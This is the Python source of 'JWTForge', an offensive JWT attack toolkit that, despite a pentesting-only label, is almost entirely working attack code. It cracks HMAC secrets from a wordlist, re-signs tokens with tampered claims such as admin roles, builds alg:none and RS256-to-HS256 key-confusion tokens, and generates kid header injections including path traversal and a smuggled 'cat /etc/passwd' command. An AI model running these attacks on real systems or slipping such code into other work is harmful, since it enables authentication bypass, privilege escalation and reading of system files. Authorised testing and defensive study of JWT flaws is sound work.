#!/usr/bin/env python3
"""
JWTForge - JWT Attack Toolkit
Author: CobraSEC
License: For authorised pentesting and bug bounty only

A self-contained JWT security assessment tool using only Python standard library.
"""

import argparse
import base64
import hashlib
import hmac
import json
import sys
import os
import urllib.parse


# ANSI colour codes
class Colours:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def c_print(colour, text):
    """Print with colour if stdout is a TTY."""
    if sys.stdout.isatty():
        print(f"{colour}{text}{Colours.ENDC}")
    else:
        print(text)


def b64url_decode(data):
    """Decode Base64URL padding-aware."""
    # Add padding if needed
    padding = 4 - len(data) % 4
    if padding != 4:
        data += '=' * padding
    return base64.urlsafe_b64decode(data)


def b64url_encode(data):
    """Encode to Base64URL without padding."""
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('utf-8')


def parse_jwt(token):
    """Parse JWT into header, payload, signature parts."""
    parts = token.split('.')
    if len(parts) != 3:
        raise ValueError("Invalid JWT format. Expected header.payload.signature")
    return parts


def decode_part(encoded):
    """Decode and JSON-parse a JWT part."""
    try:
        decoded = b64url_decode(encoded)
        return json.loads(decoded)
    except Exception as e:
        raise ValueError(f"Failed to decode part: {e}")


def decode_jwt(token):
    """Decode JWT and return header, payload as dicts, signature as bytes."""
    header_enc, payload_enc, sig_enc = parse_jwt(token)
    header = decode_part(header_enc)
    payload = decode_part(payload_enc)
    signature = b64url_decode(sig_enc) if sig_enc else b''
    return header, payload, signature, (header_enc, payload_enc, sig_enc)


def sign_hmac(header_b64, payload_b64, secret, algorithm='HS256'):
    """Create HMAC signature for JWT."""
    message = f"{header_b64}.{payload_b64}".encode('utf-8')
    alg_map = {
        'HS256': hashlib.sha256,
        'HS384': hashlib.sha384,
        'HS512': hashlib.sha512,
    }
    if algorithm not in alg_map:
        raise ValueError(f"Unsupported HMAC algorithm: {algorithm}")
    hash_func = alg_map[algorithm]
    key = secret if isinstance(secret, bytes) else secret.encode('utf-8')
    return hmac.new(key, message, hash_func).digest()


# ============================================================================
# SUBCOMMAND: DECODE
# ============================================================================

def cmd_decode(token):
    """Decode and display JWT with security analysis."""
    try:
        header, payload, signature, parts = decode_jwt(token)
    except ValueError as e:
        c_print(Colours.FAIL, f"[ERROR] {e}")
        return 1

    c_print(Colours.BOLD, "\n╔════════════════════════════════════════════════════════════════╗")
    c_print(Colours.BOLD, "║                    JWT DECODE & ANALYSIS                         ║")
    c_print(Colours.BOLD, "╚════════════════════════════════════════════════════════════════╝\n")

    # Header
    c_print(Colours.OKCYAN, "┌── HEADER")
    c_print(Colours.OKCYAN, "│")
    for k, v in header.items():
        val = json.dumps(v) if not isinstance(v, str) else v
        c_print(Colours.OKCYAN, f"│   {k}: {val}")

    # Security checks on header
    c_print(Colours.WARNING, "│")
    c_print(Colours.WARNING, "│   [Security Analysis]")
    alg = header.get('alg', '').upper()
    if alg == 'NONE':
        c_print(Colours.FAIL, f"│   ⚠ CRITICAL: alg=none - signature bypass possible!")
    elif alg.startswith('HS'):
        c_print(Colours.WARNING, f"│   ⓘ Symmetric algorithm ({alg}) - vulnerable to key confusion")
    elif alg.startswith('RS'):
        c_print(Colours.OKGREEN, f"│   ✓ Asymmetric algorithm ({alg})")
    else:
        c_print(Colours.WARNING, f"│   ? Unknown algorithm: {alg}")

    typ = header.get('typ', '').upper()
    if typ != 'JWT':
        c_print(Colours.WARNING, f"│   ⓘ Unexpected typ: {typ}")

    kid = header.get('kid')
    if kid:
        # Check for path traversal patterns
        if '../' in kid or '..\\' in kid or kid.startswith('/'):
            c_print(Colours.FAIL, f"│   ⚠ CRITICAL: kid contains path traversal pattern!")
        else:
            c_print(Colours.WARNING, f"│   ⓘ kid present: {kid} - may be injectable")

    c_print(Colours.OKCYAN, "│")
    c_print(Colours.OKCYAN, "└─────────────────────────────────────────────────────────────────")

    # Payload
    c_print(Colours.OKCYAN, "\n┌── PAYLOAD")
    c_print(Colours.OKCYAN, "│")
    for k, v in payload.items():
        val = json.dumps(v) if not isinstance(v, str) else v
        if k in ['password', 'secret', 'api_key', 'token', 'key']:
            c_print(Colours.FAIL, f"│   {k}: {val} ⚠ SENSITIVE DATA EXPOSED!")
        else:
            c_print(Colours.OKCYAN, f"│   {k}: {val}")

    # Security checks on payload
    c_print(Colours.WARNING, "│")
    c_print(Colours.WARNING, "│   [Security Analysis]")
    if 'exp' not in payload:
        c_print(Colours.FAIL, "│   ⚠ MISSING exp claim - token never expires!")
    else:
        import time
        if payload['exp'] < time.time():
            c_print(Colours.FAIL, f"│   ⚠ EXPIRED token (exp: {payload['exp']})")
        else:
            c_print(Colours.OKGREEN, f"│   ✓ Token has expiry (exp: {payload['exp']})")

    if 'nbf' in payload:
        import time
        if payload['nbf'] > time.time():
            c_print(Colours.WARNING, f"│   ⓘ Token not yet valid (nbf: {payload['nbf']})")

    if 'iss' not in payload:
        c_print(Colours.WARNING, "│   ⓘ Missing iss (issuer) claim")
    if 'aud' not in payload:
        c_print(Colours.WARNING, "│   ⓘ Missing aud (audience) claim")

    # Role escalation checks
    if 'role' in payload or 'admin' in payload:
        role = payload.get('role', '').lower() or payload.get('admin', '')
        if role in [True, 'true', 'admin', 'administrator', 'root']:
            c_print(Colours.FAIL, f"│   ⚠ Privileged claim present: {role} - check for tampering!")

    c_print(Colours.OKCYAN, "│")
    c_print(Colours.OKCYAN, "└─────────────────────────────────────────────────────────────────")

    # Signature
    c_print(Colours.OKCYAN, "\n┌── SIGNATURE")
    c_print(Colours.OKCYAN, "│")
    if signature:
        c_print(Colours.OKCYAN, f"│   Length: {len(signature)} bytes")
        c_print(Colours.OKCYAN, f"│   Hex: {signature.hex()[:64]}{'...' if len(signature.hex()) > 64 else ''}")
    else:
        c_print(Colours.FAIL, "│   EMPTY SIGNATURE (alg:none?)")
    c_print(Colours.OKCYAN, "│")
    c_print(Colours.OKCYAN, "└─────────────────────────────────────────────────────────────────\n")

    return 0


# ============================================================================
# SUBCOMMAND: CRACK
# ============================================================================

def cmd_crack(token, wordlist_path):
    """Brute-force HMAC secret from wordlist."""
    try:
        header, payload, signature, parts = decode_jwt(token)
    except ValueError as e:
        c_print(Colours.FAIL, f"[ERROR] {e}")
        return 1

    algorithm = header.get('alg', 'HS256').upper()
    if not algorithm.startswith('HS'):
        c_print(Colours.FAIL, f"[ERROR] Token uses {algorithm}, not HMAC. Cracking only supports HS256/384/512")
        return 1

    c_print(Colours.BOLD, "\n╔════════════════════════════════════════════════════════════════╗")
    c_print(Colours.BOLD, f"║              JWT SECRET CRACKING ({algorithm})                   ║")
    c_print(Colours.BOLD, "╚════════════════════════════════════════════════════════════════╝\n")

    if not os.path.exists(wordlist_path):
        c_print(Colours.FAIL, f"[ERROR] Wordlist not found: {wordlist_path}")
        return 1

    header_b64, payload_b64, sig_b64 = parts
    expected_sig = b64url_decode(sig_b64)

    word_count = 0
    found = False

    try:
        with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                secret = line.rstrip('\n\r')
                if not secret:
                    continue
                word_count += 1

                try:
                    computed = sign_hmac(header_b64, payload_b64, secret, algorithm)
                    if hmac.compare_digest(computed, expected_sig):
                        c_print(Colours.OKGREEN, f"\n✓ SECRET FOUND: '{secret}'")
                        c_print(Colours.OKGREEN, f"  Tried {word_count} candidate(s)")
                        c_print(Colours.OKCYAN, f"\n  Verified token:\n  {token}")
                        return 0
                except Exception:
                    continue

                # Progress indicator every 1000 words
                if word_count % 1000 == 0:
                    print(f"\r  Tried {word_count} candidates...", end='', flush=True)

    except KeyboardInterrupt:
        c_print(Colours.WARNING, f"\n\n[INTERRUPTED] Tried {word_count} candidates")
        return 130

    c_print(Colours.FAIL, f"\n\n✗ Secret not found in {word_count} candidates")
    return 1


# ============================================================================
# SUBCOMMAND: FORGE
# ============================================================================

def cmd_forge(token, secret, claims_modifications=None):
    """Re-sign a (tampered) JWT with a known secret."""
    try:
        header, payload, signature, parts = decode_jwt(token)
    except ValueError as e:
        c_print(Colours.FAIL, f"[ERROR] {e}")
        return 1

    algorithm = header.get('alg', 'HS256').upper()

    c_print(Colours.BOLD, "\n╔════════════════════════════════════════════════════════════════╗")
    c_print(Colours.BOLD, "║                    JWT FORGE / RE-SIGN                           ║")
    c_print(Colours.BOLD, "╚════════════════════════════════════════════════════════════════╝\n")

    # Apply modifications
    if claims_modifications:
        c_print(Colours.WARNING, "Modifying claims:")
        for claim_pair in claims_modifications:
            if '=' in claim_pair:
                k, v = claim_pair.split('=', 1)
                # Try to parse as JSON, fall back to string
                try:
                    payload[k] = json.loads(v)
                except:
                    payload[k] = v
                c_print(Colours.WARNING, f"  - {k} = {payload[k]}")

    # Build new token
    header_json = json.dumps(header, separators=(',', ':'))
    payload_json = json.dumps(payload, separators=(',', ':'))

    header_b64 = b64url_encode(header_json.encode('utf-8'))
    payload_b64 = b64url_encode(payload_json.encode('utf-8'))

    if algorithm.startswith('HS'):
        new_sig = sign_hmac(header_b64, payload_b64, secret, algorithm)
        sig_b64 = b64url_encode(new_sig)
    else:
        c_print(Colours.FAIL, f"[ERROR] Cannot forge {algorithm} - only HMAC supported")
        return 1

    forged_token = f"{header_b64}.{payload_b64}.{sig_b64}"

    c_print(Colours.OKGREEN, "Forged token:")
    c_print(Colours.OKCYAN, forged_token)
    print()
    c_print(Colours.WARNING, "Payload:")
    c_print(Colours.OKCYAN, json.dumps(payload, indent=2))
    print()

    return 0


# ============================================================================
# SUBCOMMAND: ALG-NONE
# ============================================================================

def cmd_alg_none(token):
    """Generate alg:none attack variants."""
    try:
        header, payload, signature, parts = decode_jwt(token)
    except ValueError as e:
        c_print(Colours.FAIL, f"[ERROR] {e}")
        return 1

    c_print(Colours.BOLD, "\n╔════════════════════════════════════════════════════════════════╗")
    c_print(Colours.BOLD, "║                    ALG:NONE ATTACK VARIANTS                     ║")
    c_print(Colours.BOLD, "╚════════════════════════════════════════════════════════════════╝\n")

    header_b64, payload_b64, sig_b64 = parts

    # Common alg:none bypass variants
    none_variants = ['none', 'None', 'NONE', 'nOnE', 'NoNe', 'NONe', 'None']

    results = []
    for alg_variant in none_variants:
        header['alg'] = alg_variant
        header_json = json.dumps(header, separators=(',', ':'))
        new_header_b64 = b64url_encode(header_json.encode('utf-8'))
        # Empty signature for alg:none
        variant_token = f"{new_header_b64}.{payload_b64}."
        results.append((alg_variant, variant_token))

    c_print(Colours.WARNING, "Generated variants:")
    for i, (alg, tok) in enumerate(results, 1):
        c_print(Colours.OKCYAN, f"\n{i}. alg={alg}")
        c_print(Colours.OKCYAN, tok)

    print()
    c_print(Colours.WARNING, "[NOTE] These work only if the server skips signature verification")
    c_print(Colours.WARNING, "        when 'alg: none' is present in the header.")
    print()

    return 0


# ============================================================================
# SUBCOMMAND: CONFUSE (Key Confusion)
# ============================================================================

def cmd_confuse(token, pubkey_path):
    """RS256 -> HS256 key confusion attack."""
    try:
        header, payload, signature, parts = decode_jwt(token)
    except ValueError as e:
        c_print(Colours.FAIL, f"[ERROR] {e}")
        return 1

    algorithm = header.get('alg', 'RS256').upper()

    if not algorithm.startswith('RS'):
        c_print(Colours.FAIL, f"[ERROR] Token uses {algorithm}, not RSA. Key confusion requires RS256*")
        return 1

    c_print(Colours.BOLD, "\n╔════════════════════════════════════════════════════════════════╗")
    c_print(Colours.BOLD, "║               RSA->HMAC KEY CONFUSION ATTACK                     ║")
    c_print(Colours.BOLD, "╚════════════════════════════════════════════════════════════════╝\n")

    if not os.path.exists(pubkey_path):
        c_print(Colours.FAIL, f"[ERROR] Public key file not found: {pubkey_path}")
        return 1

    # Read the public key
    try:
        with open(pubkey_path, 'rb') as f:
            pubkey_bytes = f.read()
        pubkey_str = pubkey_bytes.decode('utf-8', errors='ignore')
    except Exception as e:
        c_print(Colours.FAIL, f"[ERROR] Failed to read public key: {e}")
        return 1

    # Try different ways to extract the key material
    key_material = None

    # Try PEM format - extract between markers
    if '-----BEGIN' in pubkey_str and '-----END' in pubkey_str:
        lines = pubkey_str.split('\n')
        key_lines = []
        in_block = False
        for line in lines:
            if '-----BEGIN' in line:
                in_block = True
                continue
            if '-----END' in line:
                break
            if in_block and line.strip() and not line.startswith('---'):
                key_lines.append(line.strip())
        if key_lines:
            key_material = ''.join(key_lines).encode('utf-8')
            c_print(Colours.OKCYAN, "Extracted PEM key material")
    else:
        # Use raw bytes
        key_material = pubkey_bytes
        c_print(Colours.OKCYAN, "Using raw public key bytes")

    if not key_material:
        c_print(Colours.FAIL, "[ERROR] Could not extract key material")
        return 1

    header_b64, payload_b64, sig_b64 = parts

    results = []
    for hmac_alg in ['HS256', 'HS384', 'HS512']:
        # Change algorithm to HMAC
        header['alg'] = hmac_alg
        header_json = json.dumps(header, separators=(',', ':'))
        new_header_b64 = b64url_encode(header_json.encode('utf-8'))

        # Sign with public key as HMAC secret
        try:
            new_sig = sign_hmac(new_header_b64, payload_b64, key_material, hmac_alg)
            sig_b64_new = b64url_encode(new_sig)
            confused_token = f"{new_header_b64}.{payload_b64}.{sig_b64_new}"
            results.append((hmac_alg, confused_token))
        except Exception as e:
            continue

    if results:
        c_print(Colours.OKGREEN, "\nGenerated key-confusion tokens:")
        for alg, tok in results:
            c_print(Colours.OKCYAN, f"\n{alg}:")
            c_print(Colours.OKCYAN, tok)
        print()
        c_print(Colours.WARNING, "[NOTE] This works if the server uses the RSA public key")
        c_print(Colours.WARNING, "        to verify HMAC signatures (key confusion bug).")
    else:
        c_print(Colours.FAIL, "[ERROR] Failed to generate any confused tokens")

    print()
    return 0


# ============================================================================
# SUBCOMMAND: KID INJECTION
# ============================================================================

def cmd_kid(token, inject_prefix):
    """Generate kid injection attack variants."""
    try:
        header, payload, signature, parts = decode_jwt(token)
    except ValueError as e:
        c_print(Colours.FAIL, f"[ERROR] {e}")
        return 1

    c_print(Colours.BOLD, "\n╔════════════════════════════════════════════════════════════════╗")
    c_print(Colours.BOLD, "║                    KID INJECTION ATTACKS                       ║")
    c_print(Colours.BOLD, "╚════════════════════════════════════════════════════════════════╝\n")

    header_b64, payload_b64, sig_b64 = parts

    # Different injection payloads
    injections = [
        ("Path Traversal (empty key)", f"../../../{inject_prefix}"),
        ("Path Traversal (dev null)", "../../../../dev/null"),
        ("SQLi (always true)", "../../../sqlite:///key?or=1--"),
        ("Command Injection", "../../../key; cat /etc/passwd"),
        ("Absolute Path", f"/{inject_prefix}/key"),
    ]

    results = []
    for desc, kid_val in injections:
        header['kid'] = kid_val
        # For command injection/sql, often need alg:none or remove signature
        header['alg'] = header.get('alg', 'HS256')
        header_json = json.dumps(header, separators=(',', ':'))
        new_header_b64 = b64url_encode(header_json.encode('utf-8'))
        variant_token = f"{new_header_b64}.{payload_b64}.{sig_b64}"
        results.append((desc, kid_val, variant_token))

    c_print(Colours.WARNING, "Generated kid injection variants:")
    for i, (desc, kid_val, tok) in enumerate(results, 1):
        c_print(Colours.OKCYAN, f"\n{i}. {desc}")
        c_print(Colours.OKCYAN, f"   kid: {kid_val}")
        c_print(Colours.OKCYAN, f"   {tok}")

    print()
    c_print(Colours.WARNING, "[NOTE] These aim to manipulate the key file path or inject")
    c_print(Colours.WARNING, "        commands. Success depends on how the server loads keys.")
    print()

    return 0


# ============================================================================
# MAIN
# ============================================================================

def main():
    parser = argparse.ArgumentParser(
        prog='jwtforge',
        description='JWTForge - JWT Attack Toolkit for authorised pentesting',
        epilog='Author: CobraSEC | Use only on authorised targets'
    )

    subparsers = parser.add_subparsers(dest='command', help='Available commands')

    # DECODE
    decode_parser = subparsers.add_parser('decode', help='Decode and analyse JWT')
    decode_parser.add_argument('token', help='JWT token to decode')

    # CRACK
    crack_parser = subparsers.add_parser('crack', help='Brute-force HMAC secret')
    crack_parser.add_argument('token', help='JWT token to crack')
    crack_parser.add_argument('wordlist', help='Path to wordlist file')

    # FORGE
    forge_parser = subparsers.add_parser('forge', help='Re-sign JWT with known secret')
    forge_parser.add_argument('token', help='JWT token to re-sign')
    forge_parser.add_argument('--secret', required=True, help='Secret key for HMAC')
    forge_parser.add_argument('--set', dest='claims', action='append', metavar='key=value',
                              help='Modify claims (can use multiple times)')

    # ALG-NONE
    none_parser = subparsers.add_parser('alg-none', help='Generate alg:none attack variants')
    none_parser.add_argument('token', help='JWT token')

    # CONFUSE
    confuse_parser = subparsers.add_parser('confuse', help='RS256->HS256 key confusion')
    confuse_parser.add_argument('token', help='JWT token')
    confuse_parser.add_argument('--pubkey', required=True, help='Path to RSA public key file')

    # KID
    kid_parser = subparsers.add_parser('kid', help='Generate kid injection variants')
    kid_parser.add_argument('token', help='JWT token')
    kid_parser.add_argument('--inject', default='path/to/key',
                            help='Path prefix for injection (default: path/to/key)')

    args = parser.parse_args()

    if not args.command:
        parser.print_help()
        return 0

    # Dispatch
    if args.command == 'decode':
        return cmd_decode(args.token)
    elif args.command == 'crack':
        return cmd_crack(args.token, args.wordlist)
    elif args.command == 'forge':
        return cmd_forge(args.token, args.secret, args.claims)
    elif args.command == 'alg-none':
        return cmd_alg_none(args.token)
    elif args.command == 'confuse':
        return cmd_confuse(args.token, args.pubkey)
    elif args.command == 'kid':
        return cmd_kid(args.token, args.inject)
    else:
        parser.print_help()
        return 1


if __name__ == '__main__':
    sys.exit(main())
